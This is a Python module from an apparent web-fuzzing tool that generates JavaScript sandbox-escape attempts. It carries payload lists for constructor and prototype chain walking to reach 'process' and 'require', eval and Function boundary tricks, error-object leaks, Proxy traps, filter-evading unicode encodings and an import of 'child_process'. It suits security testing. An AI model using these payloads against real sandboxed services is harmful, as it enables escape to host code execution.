"""Sandbox escape mutator — coverage-guided JS sandbox escape discovery.

9 mutation strategies targeting JS sandbox isolation boundaries:
  S1 constructor_chain — Function.constructor chain walking
  S2 proto_pollution  — __proto__ / getPrototypeOf manipulation
  S3 function_boundary — Function(), eval(), GeneratorFunction escape
  S4 error_side_channel — Error.captureStackTrace / prepareStackTrace leak
  S5 proxy_trap — Proxy handler side-effects, Reflect API abuse
  S6 symbol_abuse — Symbol.toPrimitive, Symbol.species, @@iterator
  S7 encoding_trick — unicode escape, template literal, hex encoding
  S8 async_confusion — Promise, async/await, queueMicrotask boundary
  S9 exception_guided — error type feedback for targeted correction
"""

from __future__ import annotations

import copy
import logging
import random
import re
from typing import Any

from webfuzzer.fuzzer.protocols import Input
from webfuzzer.fuzzer.corpus import Seed

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Strategy definitions
# ---------------------------------------------------------------------------

_STRATEGY_DEFS: list[tuple[str, float]] = [
    ("constructor_chain", 0.18),
    ("proto_pollution",   0.15),
    ("function_boundary", 0.15),
    ("error_side_channel", 0.12),
    ("proxy_trap",        0.10),
    ("symbol_abuse",      0.08),
    ("encoding_trick",    0.07),
    ("async_confusion",   0.08),
    ("exception_guided",  0.07),
]

# ---------------------------------------------------------------------------
# Payload atoms — building blocks for escape attempts
# ---------------------------------------------------------------------------

# Objects that indicate sandbox escape
_ESCAPE_TARGETS = [
    "process", "require", "global", "globalThis",
    "Buffer", "module", "exports", "__dirname", "__filename",
    "console.log", "setTimeout", "setInterval",
]

# Ways to reach the global scope from inside a sandbox
_GLOBAL_ACCESS = [
    "this",
    "(function(){return this})()",
    "new Function('return this')()",
    "(0,eval)('this')",
    "Reflect.apply(function(){return this},null,[])",
    "(()=>{try{null.f()}catch(e){return e.constructor.constructor('return this')()}})()",
]

# Constructor chain patterns
_CONSTRUCTOR_CHAINS = [
    "{obj}.constructor",
    "{obj}.constructor.constructor",
    "{obj}.constructor.constructor('return {target}')()",
    "{obj}.__proto__.constructor.constructor('return {target}')()",
    "Object.getPrototypeOf({obj}).constructor.constructor('return {target}')()",
    "{obj}['__proto__']['constructor']['constructor']('return {target}')()",
    "{obj}.constructor.constructor.call(null,'return {target}')()",
    "{obj}.constructor.constructor.apply(null,['return {target}'])()",
    "{obj}.constructor.constructor.bind(null,'return {target}')()()",
]

# Prototype pollution patterns
_PROTO_PATTERNS = [
    "({obj}).__proto__",
    "({obj}).__proto__.__proto__",
    "Object.getPrototypeOf({obj})",
    "Object.getPrototypeOf(Object.getPrototypeOf({obj}))",
    "Reflect.getPrototypeOf({obj})",
    "({obj}).constructor.prototype",
    "({obj}).__proto__.constructor.prototype",
]

# Function creation patterns
_FUNCTION_CREATORS = [
    "Function('{body}')",
    "new Function('{body}')",
    "(function(){}).constructor('{body}')",
    "(async function(){}).constructor('{body}')",
    "(function*(){}).constructor('{body}')",
    "eval('{body}')",
    "(0,eval)('{body}')",
    "setTimeout('{body}',0)",
]

# Error-based leak patterns
_ERROR_PATTERNS = [
    "try{{null.f()}}catch(e){{_report(e.constructor.constructor('return {target}')())}}",
    "try{{undefined()}}catch(e){{_report(e.constructor.constructor)}}",
    "Error.captureStackTrace(new Error())",
    "new Error().stack",
    "try{{null.f()}}catch(e){{_report(e.stack)}}",
    "var o={{}};Error.captureStackTrace(o);_report(o.stack)",
]

# Proxy patterns
_PROXY_PATTERNS = [
    "new Proxy({{}},{{get:(t,p)=>_report(p)}})",
    "new Proxy({{}},{{get:(t,p,r)=>Reflect.get(global,p)}})",
    "new Proxy({{}},{{has:(t,p)=>_report(p)}})",
    "new Proxy([],{{get:(t,p)=>typeof p==='string'&&_report(p)}})",
    "var h={{get:(t,p)=>{{if(p==='then')return;return t[p]}}}}; new Proxy({{}},h)",
]

# Symbol patterns
_SYMBOL_PATTERNS = [
    "{{[Symbol.toPrimitive]:()=>{expr}}}+''",
    "{{[Symbol.iterator]:function*(){{yield {expr}}}}}",
    "{{get [Symbol.species](){{return {expr}}}}}",
    "Symbol.for('{target}')",
    "Object.getOwnPropertySymbols({obj})",
]

# Encoding tricks
_ENCODING_TRICKS = [
    ("process", "\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073"),
    ("require", "\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065"),
    ("constructor", "\\u0063onstructor"),
    ("__proto__", "\\x5f\\x5fproto\\x5f\\x5f"),
    ("return process", "\\x72eturn process"),
    ("global", "\\u0067lobal"),
]

# Async patterns
_ASYNC_PATTERNS = [
    "Promise.resolve().then(()=>_report({expr}))",
    "new Promise(r=>r({expr}))",
    "async function f(){{return {expr}}};f().then(v=>_report(v))",
    "queueMicrotask(()=>_report({expr}))",
    "(async()=>_report(await {expr}))()",
    "import('child_process').then(m=>_report(m))",
]


# ---------------------------------------------------------------------------
# Escape affinity DB
# ---------------------------------------------------------------------------

class _EscapeAffinityDB:
    """Track which payload patterns get closer to escape."""

    # Error type → escape distance (lower = closer to escape)
    _DISTANCE = {
        "escaped": 0,
        "ReferenceError": 1,   # looking for a name → close
        "TypeError": 2,        # accessed object but wrong method
        "RangeError": 2,
        "EvalError": 1,        # eval blocked → very close
        "InternalError": 2,
        "SyntaxError": 3,      # code is malformed
        "URIError": 3,
        "Error": 2,
        "Unknown": 3,
    }

    def __init__(self) -> None:
        # strategy → {error_type: count}
        self._strategy_errors: dict[str, dict[str, int]] = {}
        # (strategy, pattern_hash) → best_distance
        self._best_distance: dict[tuple[str, int], int] = {}

    def record(self, strategy: str, code_hash: int, error_type: str | None,
               escaped: bool) -> None:
        if escaped:
            dist = 0
        else:
            dist = self._DISTANCE.get(error_type or "Unknown", 3)

        key = (strategy, code_hash)
        prev = self._best_distance.get(key, 99)
        if dist < prev:
            self._best_distance[key] = dist

        self._strategy_errors.setdefault(strategy, {})
        et = "escaped" if escaped else (error_type or "Unknown")
        self._strategy_errors[strategy][et] = \
            self._strategy_errors[strategy].get(et, 0) + 1

    def get_best_strategies(self) -> list[str]:
        """Return strategies sorted by best escape distance (ascending)."""
        strat_best: dict[str, int] = {}
        for (strat, _), dist in self._best_distance.items():
            if strat not in strat_best or dist < strat_best[strat]:
                strat_best[strat] = dist
        return sorted(strat_best.keys(), key=lambda s: strat_best[s])

    def get_distance(self, strategy: str) -> int:
        """Best distance achieved by this strategy."""
        best = 99
        for (s, _), d in self._best_distance.items():
            if s == strategy and d < best:
                best = d
        return best


# ---------------------------------------------------------------------------
# Mutator
# ---------------------------------------------------------------------------

class SandboxMutator:
    """Coverage-guided JS sandbox escape mutator.

    Generates JavaScript code that attempts to escape sandboxes by:
    - Walking constructor/prototype chains to reach Function
    - Exploiting eval/Function constructor boundaries
    - Leveraging error objects to leak scope information
    - Using Proxy/Reflect to intercept sandbox guards
    - Encoding payloads to bypass string filters
    - Exploiting async boundaries for scope confusion
    """

    name = "sandbox"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)
        self._strategy_names = [n for n, _ in _STRATEGY_DEFS]
        self._strategy_methods = [
            getattr(self, f"_{n}") for n, _ in _STRATEGY_DEFS
        ]
        self._base_weights = [max(1, int(w * 100)) for _, w in _STRATEGY_DEFS]
        self._weights = list(self._base_weights)
        self._strategy_finds = [0] * len(self._strategy_methods)
        self._total_feedback_calls = 0
        self._last_hint: dict[str, Any] | None = None
        self._affinity = _EscapeAffinityDB()

    # ------------------------------------------------------------------
    # Protocol
    # ------------------------------------------------------------------

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        code = inp.data.decode("utf-8", errors="replace") if inp.data else ""

        # Pick 1-2 strategies
        n_strats = self.rng.choices([1, 2], weights=[70, 30], k=1)[0]
        applied: list[str] = []

        for _ in range(n_strats):
            idx = self.rng.choices(
                range(len(self._strategy_methods)),
                weights=self._weights,
                k=1,
            )[0]
            result = self._strategy_methods[idx](code)
            if result is not None:
                code = result
                applied.append(self._strategy_names[idx])

        if not applied:
            code = self._constructor_chain(code) or code
            applied.append("constructor_chain")

        return Input(
            data=code.encode("utf-8", errors="replace"),
            metadata={
                "mutator": self.name,
                "strategies": applied,
            },
        )

    def feedback(self, strategy_name: str, signal: str) -> None:
        self._total_feedback_calls += 1
        if strategy_name not in self._strategy_names:
            return
        idx = self._strategy_names.index(strategy_name)
        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + self._base_weights[idx],
                self._base_weights[idx] * 5,
            )
        elif signal == "coverage":
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 5, 1),
                self._base_weights[idx] * 3,
            )

    def set_exception_hint(self, hint: dict[str, Any] | None) -> None:
        self._last_hint = hint
        if not hint:
            return
        error_type = hint.get("error_type", "")
        escaped = hint.get("escaped", False)
        strategy = hint.get("strategy", "")
        code_hash = hash(hint.get("code_snippet", ""))
        if strategy:
            self._affinity.record(strategy, code_hash, error_type, escaped)

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        if boost_zero_finds:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)

    # ------------------------------------------------------------------
    # S1: Constructor chain
    # ------------------------------------------------------------------

    def _constructor_chain(self, code: str) -> str | None:
        obj = self.rng.choice(["this", "({})", "[]", "''", "0", "/x/",
                                "(function(){})", "arguments"])
        target = self.rng.choice(_ESCAPE_TARGETS)
        pattern = self.rng.choice(_CONSTRUCTOR_CHAINS)
        chain = pattern.format(obj=obj, target=target)

        if self.rng.random() < 0.5:
            return f"_report({chain})"
        else:
            return f"var _r = {chain}; _report(_r)"

    # ------------------------------------------------------------------
    # S2: Proto pollution
    # ------------------------------------------------------------------

    def _proto_pollution(self, code: str) -> str | None:
        obj = self.rng.choice(["this", "({})", "[]", "''", "(function(){})"])
        proto_access = self.rng.choice(_PROTO_PATTERNS).format(obj=obj)
        target = self.rng.choice(_ESCAPE_TARGETS)

        variants = [
            f"_report({proto_access}.constructor.constructor('return {target}')())",
            f"var _p = {proto_access}; _report(_p.constructor('return {target}')())",
            f"_report(Object.getPrototypeOf({proto_access}).constructor('return {target}')())",
        ]
        return self.rng.choice(variants)

    # ------------------------------------------------------------------
    # S3: Function boundary
    # ------------------------------------------------------------------

    def _function_boundary(self, code: str) -> str | None:
        target = self.rng.choice(_ESCAPE_TARGETS)
        body = f"return {target}"
        creator = self.rng.choice(_FUNCTION_CREATORS).replace("{body}", body)

        if "eval" in creator or "setTimeout" in creator:
            return f"_report({creator})"
        else:
            return f"_report({creator}())"

    # ------------------------------------------------------------------
    # S4: Error side channel
    # ------------------------------------------------------------------

    def _error_side_channel(self, code: str) -> str | None:
        target = self.rng.choice(_ESCAPE_TARGETS)
        pattern = self.rng.choice(_ERROR_PATTERNS).format(target=target)
        return pattern

    # ------------------------------------------------------------------
    # S5: Proxy trap
    # ------------------------------------------------------------------

    def _proxy_trap(self, code: str) -> str | None:
        return self.rng.choice(_PROXY_PATTERNS)

    # ------------------------------------------------------------------
    # S6: Symbol abuse
    # ------------------------------------------------------------------

    def _symbol_abuse(self, code: str) -> str | None:
        target = self.rng.choice(_ESCAPE_TARGETS)
        obj = self.rng.choice(["this", "({})", "[]"])
        expr = f"this.constructor.constructor('return {target}')()"
        pattern = self.rng.choice(_SYMBOL_PATTERNS).format(
            expr=expr, target=target, obj=obj)
        return f"_report({pattern})"

    # ------------------------------------------------------------------
    # S7: Encoding trick
    # ------------------------------------------------------------------

    def _encoding_trick(self, code: str) -> str | None:
        if not code:
            code = self._constructor_chain("") or "this.constructor"

        original, encoded = self.rng.choice(_ENCODING_TRICKS)
        # Replace in code
        if original in code:
            return code.replace(original, encoded, 1)

        # Generate new with encoding
        target_enc = self.rng.choice(_ENCODING_TRICKS)
        return f"_report(this.constructor.constructor('return {target_enc[1]}')())"

    # ------------------------------------------------------------------
    # S8: Async confusion
    # ------------------------------------------------------------------

    def _async_confusion(self, code: str) -> str | None:
        target = self.rng.choice(_ESCAPE_TARGETS)
        expr = f"this.constructor.constructor('return {target}')()"
        pattern = self.rng.choice(_ASYNC_PATTERNS).format(expr=expr)
        return pattern

    # ------------------------------------------------------------------
    # S9: Exception guided
    # ------------------------------------------------------------------

    def _exception_guided(self, code: str) -> str | None:
        hint = self._last_hint
        if not hint:
            return self._constructor_chain(code)

        error_type = hint.get("error_type", "")
        error_msg = hint.get("error_message", "")

        if error_type == "SyntaxError":
            # Code is malformed — try simpler expression
            return self.rng.choice([
                "_report(this.constructor)",
                "_report(typeof process)",
                "1+1",
            ])
        elif error_type == "ReferenceError":
            # Variable not found — try different access path
            if "process" in error_msg:
                return self.rng.choice([
                    "_report(this.constructor.constructor('return proc'+'ess')())",
                    "try{_report(process)}catch(e){_report(this.constructor.constructor('return process')())}",
                    "_report(typeof globalThis !== 'undefined' ? globalThis : this)",
                ])
            return self._constructor_chain(code)
        elif error_type == "TypeError":
            # Object accessed but method/property missing — try different chain
            return self._proto_pollution(code)
        elif error_type == "EvalError":
            # eval is blocked — use Function constructor instead
            return self._function_boundary(code)
        else:
            return self._constructor_chain(code)
